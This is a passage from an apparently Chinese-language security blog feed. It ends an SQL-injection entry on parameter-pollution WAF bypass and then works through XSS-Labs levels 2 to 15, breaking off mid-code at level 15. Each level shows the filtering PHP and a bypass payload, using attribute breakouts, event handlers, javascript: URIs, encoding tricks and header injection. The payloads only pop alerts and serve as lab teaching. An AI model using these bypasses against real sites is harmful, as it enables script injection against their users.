function_ invoke__">java_implimentation</span>(<span class="hljs-variable">$qs</span>);<br><span class="hljs-comment">//echo $id1;</span><br><span class="hljs-title function_ invoke__">whitelist</span>(<span class="hljs-variable">$id1</span>);<br></code></pre></td></tr></table></figure><p>最后那个pdf的内容提炼出来就是这样一张表：</p><p><img src="/2023/02/09/SQLI/image-20230719171718086.png"></p><p>可以看到搭建在apache服务器上的php服务对于传入多个相同名字的参数，服务器只解析最后一个，所以<code>$_GET[&#39;id&#39;]</code>变量实际上是最后一个id参数，但是根据waf的意思，实际上过滤的是最先出现的参数id，对第二个id参数进行注入就行了</p><p><img src="/2023/02/09/SQLI/image-20230719180637741.png"></p>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>sqli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS</title>
    <link href="/2023/02/09/XSS/"/>
    <url>/2023/02/09/XSS/</url>
    
    <content type="html"><![CDATA[<h2 id="Xss-Labs"><a href="#Xss-Labs" class="headerlink" title="Xss_Labs"></a>Xss_Labs</h2><p><em><strong>涉及到XSS查看源代码的操作均使用ViewSource，不要用开发者工具的Elements查看！不会显示HTML实体的，浏览器会自动解码！</strong></em></p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>传<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>如下：</p><p><img src="/2023/02/09/XSS/image-20230725015602870.png"></p><p>看一眼源代码，发现value属性中的字符没有变成HTML实体，而<code>&lt;h2&gt;</code>标签内的变了，说明在表单内的字符没有进行过滤，GET传入服务器时无过滤，但是服务器传回到浏览器发生转义，emmm，那就直接闭合input标签就好了</p><p><img src="/2023/02/09/XSS/image-20230725015906495.png"></p><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>用个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>探探路，表单内的和h2标签的都被转义了，</p><p><img src="/2023/02/09/XSS/image-20230725020709524.png"></p><p>那我们就看看有哪些预定义字符是会被php转义成实体的(文章参考<a href="https://cloud.tencent.com/developer/article/1516371">这篇</a>)</p><table><thead><tr><th>解码结果</th><th>描述</th><th>实体名称</th></tr></thead><tbody><tr><td></td><td>空格</td><td>&amp;nbsp;</td></tr><tr><td>&lt;</td><td>小于号</td><td>&amp;lt</td></tr><tr><td>&gt;</td><td>大于号</td><td>&amp;gt</td></tr><tr><td>&amp;</td><td>和</td><td>&amp;amp</td></tr><tr><td>“</td><td>双引号</td><td>&amp;quot</td></tr></tbody></table><p>注意单引号虽然存在实体&amp;apos但是不被转义，HTML5中预留但是也不推荐使用</p><p>先闭合value，再引入鼠标事件的属性(onclick,onfocus,<a href="https://blog.csdn.net/qq_43269730/article/details/82883031?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164371459016780269856817%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164371459016780269856817&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-82883031.first_rank_v2_pc_rank_v29&utm_term=onmouseover&spm=1018.2226.3001.4187">onmouseover,onmouseout</a>等等)</p><p>构造payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&#x27; onclick=javascript:alert(1) &#x27;</span> <span class="hljs-comment">//点击input标签时</span><br><span class="hljs-string">&#x27; onfocus=javascript:alert(1) &#x27;</span> <span class="hljs-comment">//聚焦input标签时</span><br><span class="hljs-string">&#x27; onmouseover=javascript:alert(1) &#x27;</span> <span class="hljs-comment">//进入input标签时</span><br><span class="hljs-string">&#x27; onmouseout=javascript:alert(1) &#x27;</span> <span class="hljs-comment">//移出input标签时</span><br></code></pre></td></tr></table></figure><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>依旧传入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，打开网页源码发现value没被转义但是&lt;&gt;字符被过滤，但是h2标签内被转义</p><p><img src="/2023/02/09/XSS/image-20230725163650930.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level4.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br></code></pre></td></tr></table></figure><p>试下和上一题同样的操作，但是双引号闭合：</p><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot; onmouseout=javascript:alert(1) &quot;</span><br></code></pre></td></tr></table></figure><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>依旧<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>开局，script变成scr_ipt，再试试鼠标事件，on变成o_n，试一下大写绕过，结果全被换成小写，</p><p><img src="/2023/02/09/XSS/image-20230725201920714.png"></p><p><img src="/2023/02/09/XSS/image-20230725202104878.png"></p><p>去看下后端代码，script和on被替换，并且strtolower()函数存在，全转成小写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level5.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br></code></pre></td></tr></table></figure><p>尝试js伪协议：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;a href=<span class="hljs-attr">javascript</span>:<span class="hljs-regexp">/0/</span>,<span class="hljs-title function_">alert</span>(%22M%<span class="hljs-number">22</span>)&gt;M&lt;/a&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:/00/,alert(%22M%22)</span>&gt;</span>M<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:/000/,alert(%22M%22)</span>&gt;</span>M<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:/M/,alert(%22M%22)</span>&gt;</span>M<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;a href=&#x27;javascript:alert(1)&#x27;&gt;m&lt;/a&gt;</span><br></code></pre></td></tr></table></figure><p>点击这个链接：</p><p><img src="/2023/02/09/XSS/image-20230725203423521.png"></p><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>前面踩坑过程都一样，直接上后端代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level6.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br></code></pre></td></tr></table></figure><p>与上一题不同的是，这题没有小写转换，大写绕过下</p><p>payload：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;Script&gt;alert(1)&lt;/Script&gt;</span><br></code></pre></td></tr></table></figure><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>直接上后端代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> =<span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level7.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br></code></pre></td></tr></table></figure><p>全转成小写再过滤，很明显双写绕过了</p><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;/scriscriptpt&gt;</span><br></code></pre></td></tr></table></figure><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>后端代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level8.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>是把传入的字符串进行转小写之后进行一系列过滤操作，最后将字符写入a标签的href属性中，跳转链接</p><p>利用js伪协议，传<code>javascript:alert(1)</code>，但是script被过滤，上网搜了下，可以使用unicode编码</p><p><img src="/2023/02/09/XSS/image-20230725212908598.png"></p><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>上代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level9.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span>===<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str7</span>,<span class="hljs-string">&#x27;http://&#x27;</span>))<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>        &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>下面多了个strpos()函数的验证，输入字符串必须包含’http:&#x2F;&#x2F;‘，emmm，可是你也妹说在哪写’http:&#x2F;&#x2F;‘，直接和第八题一样</p><p>编码’javascript’：<br><img src="/2023/02/09/XSS/image-20230725213747632.png"></p><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;:<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;http://&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>话不多说，上代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>emmm，表单隐藏起来了呀，小问题，这不是可以GET传参嘛</p><p>传了个<code>&quot; onclick=&#39;javascript:alert(1)&#39;</code>，唉呦吼吼，忘记了，表单隐藏了，所以没法点击，想了个办法，但是感觉是非预期解吧。。就是开开发者工具修改网页代码，把type属性删掉，过是过了，但是好蠢www，去网上看了下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">?keyword=nul&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)<br></code></pre></td></tr></table></figure><p>这里input标签内将会出现两个type属性，浏览器通常会判定第一个出现的值作为最终的值</p><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先看参数t_sort，想通过覆盖type属性的值就要闭合双引号，就会被转义，是行不通的，那就通过t_ref参数，修改ref头来进行xss</p><p><img src="/2023/02/09/XSS/image-20230726002207122.png"></p><h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p>同上，换成了ua</p><p><img src="/2023/02/09/XSS/image-20230726004036006.png"></p><h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>同上，换成了cookie</p><p><img src="/2023/02/09/XSS/image-20230726004718763.png"></p><h3 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h3><p>题目出问题了，做不了</p><h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span 